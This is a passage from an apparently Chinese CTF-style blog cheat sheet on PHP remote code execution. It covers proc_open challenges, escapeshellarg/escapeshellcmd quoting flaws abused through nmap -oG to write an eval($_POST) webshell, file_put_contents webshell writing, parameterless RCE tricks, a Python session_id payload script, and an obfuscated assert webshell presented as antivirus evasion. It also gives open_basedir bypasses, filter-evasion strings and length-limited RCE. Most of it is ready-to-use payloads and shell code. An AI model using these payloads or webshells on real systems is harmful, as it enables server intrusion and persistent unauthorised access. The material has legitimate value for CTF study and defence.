class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。</span></span><br><span class="line">    <span class="variable">$return_value</span> = <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;command returned <span class="subst">$return_value</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>jacko神的题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$c1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c1&#x27;</span>];</span><br><span class="line"><span class="variable">$c2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s|\$|&#123;/&#x27;</span>,<span class="variable">$c1</span>.<span class="variable">$c2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not allowed&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;/tmp/error&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"> );</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c1</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>],<span class="variable">$c2</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c1=php&amp;c2=&lt;?=`cat\x20/f*`;?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id> ``</span></h3>
<p>相当于<code>shell_exec</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>``;<span class="meta">?&gt;</span></span><br><span class="line">相当于<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>();</span><br></pre></td></tr></table></figure>
<h3><span id="escapeshellarg-escapeshellcmd"> escapeshellarg + escapeshellcmd</span></h3>
<p>这里在我的飞书上出现过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];<span class="comment">//get传参</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);  <span class="comment">//escapeshellarg</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  <span class="comment">//escapeshellcmd</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);<span class="comment">//nmap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里利用<code>nmap 内容 -oG filename</code>可以将内容写入到文件名内</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg();</span><br><span class="line">其功能是给字符串增加一对单引号，并且能够引用或者转码任何已存在的单引号</span><br><span class="line">例子：</span><br><span class="line">echo escapeshellarg(1);</span><br><span class="line">会输出 &#x27;1&#x27;</span><br><span class="line">echo escapeshellarg(&quot;1&quot;);</span><br><span class="line">会输出&#x27;1&#x27;</span><br><span class="line">echo escapeshellarg(&quot;&#x27;1&#x27;&quot;);</span><br><span class="line">会输出 &#x27;&#x27;\&#x27;&#x27;1&#x27;\&#x27;&#x27;</span><br><span class="line">echo escapeshellarg(&#x27;&quot;1&quot;&#x27;);</span><br><span class="line">会输出&#x27;&quot;1&quot;&#x27;</span><br><span class="line">echo escapeshellarg(&quot; &#x27;&#x27;a&#x27;&#x27; &quot;);</span><br><span class="line">会输出 &#x27; &#x27;\&#x27;&#x27;&#x27;\&#x27;&#x27;a&#x27;\&#x27;&#x27;&#x27;\&#x27;&#x27; &#x27;</span><br><span class="line">分析一下其流程大概是这样的：</span><br><span class="line">1. 如果是没有单引号的会给它添加一对单引号</span><br><span class="line"></span><br><span class="line">2. 如果只有双引号括住的，此时会将双引号转化为单引号</span><br><span class="line"></span><br><span class="line">3.里面有单引号的，在每一个单引号前都加上&#x27;\&#x27;</span><br><span class="line"></span><br><span class="line">例如上面的a有两个引号，此时每个引号前都被加上了&#x27;\&#x27;:</span><br><span class="line">分割一下是这样的：</span><br><span class="line">&#x27; &#x27;\&#x27;&#x27;(第一个引号)&#x27;\&#x27;&#x27;(第二个引号)a&#x27;\&#x27;&#x27;(第三个引号)&#x27;\&#x27;&#x27;(第四个引号) &#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd()</span><br><span class="line">escapeshellcmd会对字符串中可能存在欺骗shell从而执行任意命令的符号进行转义，同时这个函数保证在用户的数据输入到exec或者system中时进行转义</span><br><span class="line"></span><br><span class="line">反斜线会在下面的符号进行插入</span><br><span class="line"></span><br><span class="line">&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *&#x27; 和 &quot; 仅在不配对儿的时候被转义。 </span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br><span class="line">转换原理为：</span><br><span class="line">1. 对于&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*前会直接加\</span><br><span class="line">2. 对于&#x27; &quot;，仅在不配对时加\</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">$a=&quot;&#x27;&quot;;</span><br><span class="line">echo escapeshellcmd($a);</span><br><span class="line">输出结果为\&#x27;</span><br><span class="line">如果是&#x27;&#x27;，则输出结果为&#x27;&#x27;，双引号同理</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">&lt;?php</span><br><span class="line">	$a = &quot;&amp; # ; ` | \ ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ * \x0A end&quot;;</span><br><span class="line">	echo escapeshellcmd($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">\&amp; \# \; \` \| \\ \? \~ \&lt; \&gt; \^ \( \) \[ \] \&#123; \&#125; \$ \* \</span><br><span class="line"> end</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这两个函数是不能调换使用顺序的</p>
<p>即不能够在<code>escapeshellarg()</code>后使用<code>escapeshellcmd()</code></p>
<p>否则可能会造成一些单引号的闭合：</p>
<p>例如我有一个木马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>我要写入一下</p>
<p>经过escapeshellarg后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>经过escapeshellarg后再经过escapeshellcmd:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;\&lt;\?php @eval\(\$_POST\[\&quot;a\&quot;\]\)\;\?\&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>符合我们的预期</p>
<p>但是，如果我们的木马改成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>此时经过escapeshellarg就会变成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;\&#x27;&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>再经过escapeshellcmd：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\&lt;\?php @<span class="keyword">eval</span>\(\<span class="variable">$_POST</span>\[\<span class="string">&#x27;a\&#x27;\]\)\;\?\&gt;&#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>处理一下就相当于变成了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="meta">?&gt;</span>\\</span><br></pre></td></tr></table></figure>
<p>此时就相当于成功执行了一个shell</p>
<p>但是如果我们要写入的话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php</span><br></pre></td></tr></table></figure>
<p>payload的话还需要加入前后的空格：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>
<p>如果不加的话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php @eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG 1.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="meta">?&gt;</span> -oG <span class="number">1</span>.php\\</span><br></pre></td></tr></table></figure>
<p>导致后面写入错误</p>
<p>所以要加个空格</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>
<h3><span id="file_put_contents写马"> file_put_contents写马</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;&lt;?php @eval(\x24_POST[1]);?&gt;&quot;</span>);</span><br><span class="line">或者</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3><span id="include-读文件"> include 读文件</span></h3>
<p>利用ctfshow命令执行的姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=1.php</span><br></pre></td></tr></table></figure>
<h2><span id="php-无参数rce"> PHP 无参数rce</span></h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用:</span><br><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>如果过滤了，可以利用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()));</span><br></pre></td></tr></table></figure>
<p>读当前目录：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>
<p>随机编码爆破：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>()))));</span><br></pre></td></tr></table></figure>
<p>当然还有<code>rand</code></p>
<h3><span id="请求头传递参数"> 请求头传递参数</span></h3>
<p><code>getallheaders();</code>获取到所有的http报头</p>
<p>利用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallhandlers</span>()));</span><br><span class="line"><span class="comment">//测试返回的请求头是什么，然后直接改这个请求头就好</span></span><br></pre></td></tr></table></figure>
<p>还可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">apache_request_headers</span>());</span><br></pre></td></tr></table></figure>
<p>还可以:</p>
<ul>
<li>array_reverse()，反转数组</li>
<li>next，取数组的下一位</li>
</ul>
<p><code>get_defined_vars()</code></p>
<p>类似无中生有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(next(get_defined_vars())));&amp;b=</span><br></pre></td></tr></table></figure>
<p><code>call_user_func</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=call_user_func(&#x27;create_function&#x27;,&#x27;&#x27;,&#x27;&#125;eval(phpinfo());/*&#x27;)%3b</span><br></pre></td></tr></table></figure>
<p>利用反序列化写马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(...unserialize(next(getallheaders()))); );</span><br><span class="line"></span><br><span class="line">在请求头内写自己的序列化结果</span><br></pre></td></tr></table></figure>
<h3><span id="session_id"> session_id:</span></h3>
<p>phpsession_id只允许数字和字母，利用hex2bin转换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;echo &#x27;payload OK!&#x27;;&quot;</span>.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
<h2><span id="php-无数字字母rce"> PHP 无数字字母RCE</span></h2>
<p>详见我的看看无数字字母RCE</p>
<p><a target="_blank" rel="noopener" href="https://err0r233.github.io/posts/47468.html">简单看看无数字字母RCE | Err0r233</a></p>
<h2><span id="免杀"> 免杀(?)</span></h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;ass&#x27;</span>;</span><br><span class="line">	<span class="variable">$b</span> = <span class="string">&#x27;er&#x27;</span>;</span><br><span class="line">	<span class="variable">$c</span> = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">	<span class="variable">$d</span> = <span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>;</span><br><span class="line">	<span class="variable">$e</span> = <span class="string">&#x27;_P&#x27;</span>;</span><br><span class="line">	<span class="variable">$f</span> = <span class="string">&#x27;OST&#x27;</span>;</span><br><span class="line">	<span class="variable">$g</span> = <span class="variable">$e</span>.<span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$d</span>(<span class="variable">$$g</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用<code>strtr()</code>将子字符串替换为给定的字符串</p>
<p>例如将<code>Hello World</code>替换为<code>Hi Earth</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span> =&gt; <span class="string">&quot;Hi&quot;</span>, <span class="string">&quot;world&quot;</span> =&gt; <span class="string">&quot;Earth&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strtr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">$str1</span> = <span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$str2</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$str1</span>,<span class="keyword">array</span>(<span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;</span>=&gt;<span class="string">&#x27;as&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)&#x27;</span>=&gt;<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;r&amp;%F%*^G*t&#x27;</span>=&gt;<span class="string">&#x27;rt&#x27;</span>));</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$str3</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$str2</span>,<span class="keyword">array</span>(<span class="string">&#x27;s,&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;</span>=&gt;<span class="string">&#x27;er&#x27;</span>));<span class="comment">//assert</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ==<span class="string">&#x27;xxxx&#x27;</span>)&#123;<span class="comment">//随便起个md5，便于你控制</span></span><br><span class="line"> </span><br><span class="line">      <span class="variable">$str4</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">      <span class="variable">$str5</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$str4</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="variable">$str3</span>(<span class="variable">$str5</span>);<span class="comment">//assert($_POST[&#x27;a&#x27;]);</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="绕open_basedir"> 绕open_basedir</span></h2>
<p>读目录：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span>%<span class="number">20</span><span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span>%<span class="number">20</span><span class="keyword">as</span>%<span class="number">20</span><span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().%<span class="number">27</span>%<span class="number">20</span>%<span class="number">27</span>);&#125;%<span class="number">20</span><span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当然，直接绕：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&#x27;a&#x27;);chdir(&#x27;a&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br></pre></td></tr></table></figure>
<h2><span id="绕过"> 绕过</span></h2>
<p>拼接：</p>
<ul>
<li>system(‘cat /flag’) 相当于 system(‘cat /f’.‘lag’);</li>
<li>单双引号拼接</li>
<li>chr函数拼接</li>
<li>eval的独特拼接：(sy.(st).em)</li>
</ul>
<p>十六进制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`\x6c\x73`;</span><br><span class="line"></span><br><span class="line">echo $(ls);</span><br></pre></td></tr></table></figure>
<p>过滤括号，利用<code>include</code>等不需要括号的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include$_GET[1]?&gt;&amp;1=</span><br></pre></td></tr></table></figure>
<p>过滤了分号：</p>
<p>如果是eval函数的话，可以直接将<code>;</code>换成<code>?&gt;</code></p>
<p>相当于短标签(?)</p>
<p>include、assert、system都可以利用</p>
<h2><span id="有限制长度的rce"> 有限制长度的rce</span></h2>
<h3><span id="前置知识"> 前置知识</span></h3>
<p>在linux中，利用<code>sh</code>可以直接把文件当成sh脚本执行</p>
<p>利用<code>php</code>可以直接将文件作为php执行</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/109206728">CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总</a></p>
<p>利用的思路是通过写文件，然后利用<code>ls -t</code>将其全部写入一个文件中，最后执行<code>sh</code>：</p>
<h3><span id="7字符的rce"> 7字符的rce</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span 